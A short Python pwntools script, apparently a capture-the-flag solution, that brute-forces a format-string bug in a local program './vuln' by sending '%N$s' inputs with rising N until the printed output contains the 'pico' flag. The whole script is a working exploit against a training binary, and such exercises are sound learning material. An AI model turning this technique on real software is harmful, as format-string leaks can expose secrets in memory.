from pwn import *
i=1
while(True):
    p = process("./vuln")
    payload = """%{}$s""".format(i)
    p.recvuntil("input whatever string you want; then it will be printed back:")
    try:
        p.sendline(payload)
        p.recvuntil("will be printed:")
        response = p.recvall()
        if 'pico' in response:
            break
    except:
        pass
    finally:
        i = i+1
        p.close()
print response